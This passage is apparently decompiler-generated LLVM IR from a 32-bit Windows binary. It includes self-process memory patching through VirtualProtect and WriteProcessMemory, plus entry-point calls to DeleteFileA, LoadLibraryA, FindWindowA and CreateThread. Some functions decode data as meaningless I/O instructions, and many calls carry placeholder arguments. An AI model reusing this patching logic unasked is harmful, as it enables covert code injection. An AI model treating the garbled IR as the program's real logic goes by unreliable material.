  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2109
  %40 = icmp eq i1 %39, false, !insn.addr !2110
  br i1 %40, label %dec_label_pc_40774a, label %dec_label_pc_40770f, !insn.addr !2110

dec_label_pc_40770f:                              ; preds = %dec_label_pc_40770a
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2111
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2111
  store i32 %20, i32* %42, align 4, !insn.addr !2111
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2112
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2112
  store i32 128, i32* %44, align 4, !insn.addr !2112
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2113
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2113
  store i32 4, i32* %46, align 4, !insn.addr !2113
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2114
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2114
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2114
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2115
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2116
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2116
  store i32 %21, i32* %51, align 4, !insn.addr !2116
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2117
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2117
  store i32 4, i32* %53, align 4, !insn.addr !2117
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2118
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2118
  store i32 %22, i32* %55, align 4, !insn.addr !2118
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2119
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2119
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2119
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2120
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2120
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2121
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2121
  store i32 %59, i32* %61, align 4, !insn.addr !2121
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2122
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2123
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2123
  store i32 %21, i32* %64, align 4, !insn.addr !2123
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2124
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2125
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2125
  store i32 %65, i32* %67, align 4, !insn.addr !2125
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2126
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2126
  store i32 4, i32* %69, align 4, !insn.addr !2126
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2127
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2127
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2127
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2128
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2129
  br label %dec_label_pc_407753, !insn.addr !2129

dec_label_pc_40774a:                              ; preds = %dec_label_pc_40770a
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2130
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2106
  %75 = load i32, i32* %74, align 4, !insn.addr !2106
  %76 = icmp eq i32 %75, 0, !insn.addr !2107
  %77 = icmp eq i1 %76, false, !insn.addr !2108
  store i32 %75, i32* %.reg2mem14, !insn.addr !2108
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2108
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2108
  br i1 %77, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2108

dec_label_pc_407753:                              ; preds = %dec_label_pc_40774a, %dec_label_pc_407702, %dec_label_pc_40770f, %dec_label_pc_4076ef
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2131
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2094
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2094
  %81 = load i32, i32* %80, align 4, !insn.addr !2094
  %82 = icmp eq i32 %81, 0, !insn.addr !2095
  %83 = icmp eq i1 %82, false, !insn.addr !2096
  store i32 %81, i32* %.reg2mem, !insn.addr !2096
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2096
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2096
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2096
  br i1 %83, label %dec_label_pc_4076ef, label %dec_label_pc_40775d, !insn.addr !2096

dec_label_pc_40775d:                              ; preds = %dec_label_pc_407753, %dec_label_pc_407756.preheader, %dec_label_pc_4076d6, %dec_label_pc_4076b0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2132
}

define i32 @function_407768(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407768:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2133
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2133
  %3 = load i32, i32* %2, align 4, !insn.addr !2133
  ret i32 %3, !insn.addr !2134
}

define i32 @function_40776c() local_unnamed_addr {
dec_label_pc_40776c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2135
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2135
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2135
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2136
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2137
  %3 = add i32 %2, 1, !insn.addr !2137
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2137
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2138
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2139
  ret i32 0, !insn.addr !2140
}

define i32 @function_407791() local_unnamed_addr {
dec_label_pc_407791:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2141
  ret i32 %0, !insn.addr !2141
}

define i32 @function_407796() local_unnamed_addr {
dec_label_pc_407796:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2142
}

define i32 @function_407798(i32 %arg1) local_unnamed_addr {
dec_label_pc_407798:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2143
}

define i32 @function_40779c() local_unnamed_addr {
dec_label_pc_40779c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2144
  %2 = add i32 %1, -1, !insn.addr !2144
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2144
  ret i32 %0, !insn.addr !2145
}

define i32 @function_4077a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_407768(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2146
  ret i32 %3, !insn.addr !2147
}

define i32 @function_4077f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4077f0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2148
  %2 = icmp eq i1 %1, false, !insn.addr !2149
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_407768(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2150
  ret i32 %3, !insn.addr !2151
}

define i32 @function_407820(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407820:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2152
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2152
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2152
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2153
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2154
  %3 = call i32 @"@LStrPos"(), !insn.addr !2155
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2156
  %6 = call i32 @"@LStrPos"(), !insn.addr !2157
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %8 = call i32 @function_407768(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2158
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2159
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2160
  ret i32 %9, !insn.addr !2161
}

define i32 @function_4078b8() local_unnamed_addr {
dec_label_pc_4078b8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2162
  ret i32 %0, !insn.addr !2162
}

define i32 @function_4078bd() local_unnamed_addr {
dec_label_pc_4078bd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2163
}

define i32 @function_4078bf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2164
}

define i32 @function_4078cf() local_unnamed_addr {
dec_label_pc_4078cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2165
}

define i32 @function_40791c() local_unnamed_addr {
dec_label_pc_40791c:
  %0 = call i32 @function_4075dc(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40798c, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407998, i32 0, i32 0), i32 4224932), !insn.addr !2166
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2167
  %1 = call i32 @function_4075dc(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40798c, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079b4, i32 0, i32 0), i32 4225008), !insn.addr !2168
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2169
  %2 = call i32 @function_4075dc(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079cc, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_4079d8, i32 0, i32 0), i32 4225056), !insn.addr !2170
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2171
  ret i32 %2, !insn.addr !2172
}

define i32 @function_40798c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_40798c:
  %merge.reg2mem = alloca i32, !insn.addr !2173
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2173
  br i1 %10, label %dec_label_pc_4079bb, label %dec_label_pc_40798e, !insn.addr !2173

dec_label_pc_40798e:                              ; preds = %dec_label_pc_40798c
  br i1 %8, label %dec_label_pc_4079c4, label %dec_label_pc_407991, !insn.addr !2174

dec_label_pc_407991:                              ; preds = %dec_label_pc_40798e
  %11 = trunc i32 %4 to i16, !insn.addr !2175
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2175
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2175
  store i8 %12, i8* %13, align 1, !insn.addr !2175
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2176
  store i8 %14, i8* %13, align 1, !insn.addr !2176
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2177
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2177
  %19 = add i8 %16, %18, !insn.addr !2177
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2177
  store i8 %19, i8* %20, align 1, !insn.addr !2177
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2178
  %21 = trunc i32 %arg10 to i16, !insn.addr !2179
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2179
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2179
  store i32 %22, i32* %23, align 4, !insn.addr !2179
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2180
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2181
  %25 = load i8, i8* %24, align 1, !insn.addr !2181
  %26 = trunc i32 %arg1 to i8, !insn.addr !2181
  %27 = add i8 %25, %26, !insn.addr !2181
  store i8 %27, i8* %24, align 1, !insn.addr !2181
  %28 = trunc i32 %arg3 to i16, !insn.addr !2182
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2182
  %30 = load i32, i32* %29, align 4, !insn.addr !2182
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2182
  %31 = add i32 %arg5, 67, !insn.addr !2183
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2183
  %34 = load i32, i32* %33, align 4, !insn.addr !2183
  %35 = load i8, i8* %24, align 1, !insn.addr !2184
  %36 = add i8 %35, %26, !insn.addr !2184
  store i8 %36, i8* %24, align 1, !insn.addr !2184
  %37 = mul i32 %34, 1557718248, !insn.addr !2185
  %38 = add i32 %arg7, 97, !insn.addr !2185
  %39 = add i32 %38, %37, !insn.addr !2185
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2185
  %41 = load i8, i8* %40, align 1, !insn.addr !2185
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2185
  %44 = add i8 %43, %41, !insn.addr !2185
  %45 = icmp eq i8 %44, 0, !insn.addr !2185
  store i8 %44, i8* %40, align 1, !insn.addr !2185
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2186
  br i1 %45, label %dec_label_pc_407a2d, label %dec_label_pc_4079bb, !insn.addr !2186

dec_label_pc_4079bb:                              ; preds = %dec_label_pc_40798c, %dec_label_pc_407991
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2187

dec_label_pc_4079c4:                              ; preds = %dec_label_pc_40798e
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2188
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2188
  store i8 %48, i8* %49, align 1, !insn.addr !2188
  %50 = add i32 %3, 104, !insn.addr !2189
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2189
  %52 = load i8, i8* %51, align 1, !insn.addr !2189
  %53 = udiv i32 %4, 256, !insn.addr !2189
  %54 = trunc i32 %53 to i8, !insn.addr !2189
  %55 = add i8 %52, %54, !insn.addr !2189
  store i8 %55, i8* %51, align 1, !insn.addr !2189
  %56 = trunc i32 %4 to i16, !insn.addr !2190
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2190
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2190
  store i8 %57, i8* %58, align 1, !insn.addr !2190
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2191
  store i8 %59, i8* %58, align 1, !insn.addr !2191
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2192
  store i8 %60, i8* %58, align 1, !insn.addr !2192
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2193
  store i8 %61, i8* %58, align 1, !insn.addr !2193
  %62 = load i8, i8* %51, align 1, !insn.addr !2194
  %63 = trunc i32 %4 to i8, !insn.addr !2194
  %64 = add i8 %62, %63, !insn.addr !2194
  store i8 %64, i8* %51, align 1, !insn.addr !2194
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2195
  store i8 %65, i8* %58, align 1, !insn.addr !2195
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2196
  store i8 %66, i8* %58, align 1, !insn.addr !2196
  %67 = add i32 %2, 1, !insn.addr !2197
  %68 = icmp slt i32 %67, 0, !insn.addr !2197
  br i1 %68, label %dec_label_pc_407a45, label %dec_label_pc_4079e0, !insn.addr !2198

dec_label_pc_4079e0:                              ; preds = %dec_label_pc_4079c4
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2199
  %72 = xor i32 %4, %1, !insn.addr !2200
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2201
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2201
  %76 = load i16, i16* %75, align 2, !insn.addr !2201
  %77 = trunc i32 %72 to i16, !insn.addr !2201
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2201
  %78 = load i8, i8* %73, align 4, !insn.addr !2202
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2202
  %81 = add i8 %78, %80, !insn.addr !2202
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2202
  store i8 %81, i8* %82, align 1, !insn.addr !2202
  %83 = add i32 %71, 82, !insn.addr !2203
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2203
  %85 = load i8, i8* %84, align 1, !insn.addr !2203
  %86 = add i8 %85, %63, !insn.addr !2203
  store i8 %86, i8* %84, align 1, !insn.addr !2203
  %87 = load i32, i32* %eax, align 4, !insn.addr !2204
  %88 = add i32 %87, -1, !insn.addr !2204
  %89 = add i32 %71, 4227341, !insn.addr !2205
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2205
  %91 = load i8, i8* %90, align 1, !insn.addr !2205
  %92 = udiv i32 %88, 256, !insn.addr !2205
  %93 = trunc i32 %92 to i8, !insn.addr !2205
  %94 = add i8 %91, %93, !insn.addr !2205
  store i8 %94, i8* %90, align 1, !insn.addr !2205
  ret i32 %88, !insn.addr !2205

dec_label_pc_407a2d:                              ; preds = %dec_label_pc_407991
  %95 = add i32 %46, 1, !insn.addr !2206
  store i32 %95, i32* %eax, align 4, !insn.addr !2206
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2207
  %97 = load i8, i8* %96, align 1, !insn.addr !2207
  %98 = udiv i32 %arg3, 256, !insn.addr !2207
  %99 = trunc i32 %98 to i8, !insn.addr !2207
  %100 = add i8 %97, %99, !insn.addr !2207
  store i8 %100, i8* %96, align 1, !insn.addr !2207
  %101 = add i32 %arg3, 89, !insn.addr !2208
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2208
  store i8 -1, i8* %102, align 1, !insn.addr !2208
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2209
  %103 = load i32, i32* %eax, align 4, !insn.addr !2210
  ret i32 %103, !insn.addr !2210

dec_label_pc_407a45:                              ; preds = %dec_label_pc_4079c4
  %104 = load i32, i32* %eax, align 4, !insn.addr !2211
  ret i32 %104, !insn.addr !2211
}

define i32 @function_407a48() local_unnamed_addr {
dec_label_pc_407a48:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2212
  %2 = add i32 %1, -1, !insn.addr !2212
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2212
  ret i32 %0, !insn.addr !2213
}

define i32 @function_407a50() local_unnamed_addr {
dec_label_pc_407a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2214
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a7b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2215
  ret i32 %0, !insn.addr !2215
}

define i32 @function_407a80() local_unnamed_addr {
dec_label_pc_407a80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2216
}

define i32 @function_407a82(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2217
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b7c:
  %esp.2.reg2mem = alloca i32, !insn.addr !2218
  %esp.1.reg2mem = alloca i32, !insn.addr !2218
  %esp.0.reg2mem = alloca i32, !insn.addr !2218
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2219
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2220
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2220
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2220
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2221
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2222
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f8 to i8*), i32 0), !insn.addr !2223
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2224
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2224
  store i8 0, i8* %6, align 1, !insn.addr !2224
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2225
  %8 = call i32 @function_407008(), !insn.addr !2226
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2227
  %10 = call i32 @function_407080(), !insn.addr !2228
  %11 = trunc i32 %10 to i8, !insn.addr !2229
  %12 = icmp eq i8 %11, 0, !insn.addr !2229
  br i1 %12, label %dec_label_pc_407c83, label %dec_label_pc_407c08, !insn.addr !2230

dec_label_pc_407c08:                              ; preds = %dec_label_pc_407b7c
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2231
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2232
  store i32 -1, i32* %14, align 4, !insn.addr !2232
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2233
  %16 = call i32 @function_407048(), !insn.addr !2234
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2235
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2236
  %19 = call i32 @function_4036c8(), !insn.addr !2237
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2238
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2239
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2240
  %23 = call i32 @function_4036c8(), !insn.addr !2241
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2242
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2242
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2242
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2243
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2243
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2244
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2245
  br label %dec_label_pc_407cb0, !insn.addr !2245

dec_label_pc_407c83:                              ; preds = %dec_label_pc_407b7c
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2222
  %29 = call i32 @function_4060f0(), !insn.addr !2246
  %30 = call i32 @function_407080(), !insn.addr !2247
  %31 = trunc i32 %30 to i8, !insn.addr !2248
  %32 = icmp eq i8 %31, 0, !insn.addr !2248
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2249
  br i1 %32, label %dec_label_pc_407df2, label %dec_label_pc_407ca5, !insn.addr !2249

dec_label_pc_407ca5:                              ; preds = %dec_label_pc_407c83
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2250
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2251
  store i32 -1, i32* %34, align 4, !insn.addr !2251
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2251
  br label %dec_label_pc_407cb0, !insn.addr !2251

dec_label_pc_407cb0:                              ; preds = %dec_label_pc_407ca5, %dec_label_pc_407c08
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2252
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2252
  store i32 260, i32* %36, align 4, !insn.addr !2252
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2253
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2253
  store i32 ptrtoint (i8** @global_var_4096f8 to i32), i32* %38, align 4, !insn.addr !2253
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2254
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2254
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2255
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2255
  store i32 %40, i32* %42, align 4, !insn.addr !2255
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2256
  %44 = add i32 %43, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2257
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2257
  store i8 0, i8* %45, align 1, !insn.addr !2257
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2258
  %47 = call i32 @function_407048(), !insn.addr !2259
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2260
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2261
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2262
  %51 = icmp eq i32 %50, 0, !insn.addr !2262
  br i1 %51, label %dec_label_pc_407d49, label %dec_label_pc_407d16, !insn.addr !2263

dec_label_pc_407d16:                              ; preds = %dec_label_pc_407cb0
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2264
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2264
  store i32 ptrtoint ([16 x i8]* @global_var_407e74 to i32), i32* %53, align 4, !insn.addr !2264
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2265
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2265
  store i32 ptrtoint ([8 x i8]* @global_var_407e84 to i32), i32* %55, align 4, !insn.addr !2265
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2266
  %57 = icmp eq i32* %56, null, !insn.addr !2267
  %58 = icmp eq i1 %57, false, !insn.addr !2268
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2268
  br i1 %58, label %dec_label_pc_407df2, label %dec_label_pc_407d2d, !insn.addr !2268

dec_label_pc_407d2d:                              ; preds = %dec_label_pc_407d16
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2269
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2269
  store i32 ptrtoint (i32* @global_var_409808 to i32), i32* %60, align 4, !insn.addr !2269
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2270
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2270
  store i32 0, i32* %62, align 4, !insn.addr !2270
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2271
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2271
  store i32 66, i32* %64, align 4, !insn.addr !2271
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2272
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2272
  store i32 4220648, i32* %66, align 4, !insn.addr !2272
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2273
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2273
  store i32 0, i32* %68, align 4, !insn.addr !2273
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2274
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2274
  store i32 0, i32* %70, align 4, !insn.addr !2274
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2275
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2276
  br label %dec_label_pc_407df2, !insn.addr !2276

dec_label_pc_407d49:                              ; preds = %dec_label_pc_407cb0
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2277
  %73 = icmp eq i32 %72, 0, !insn.addr !2277
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2278
